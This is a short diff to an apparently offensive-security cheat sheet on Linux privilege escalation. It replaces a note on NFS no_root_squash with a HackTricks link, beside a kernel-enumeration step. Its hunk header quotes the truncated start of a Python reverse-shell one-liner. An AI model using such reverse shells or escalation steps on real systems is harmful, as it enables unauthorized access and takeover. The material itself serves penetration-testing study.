@@ -4176,7 +4176,7 @@ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREA
 **Root Squashing**
 - Root Squashing is how NFS prevents an obvious privilege escalation
 - `no_root_squash` turns root squashing off
-- Check the contents of `/etc/exports` for shares with the `no_root_squash` option
+- Check: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
 
 #### <ins>Kernel Exploits</ins>
 - Enumerate the kernel version `uname -a`
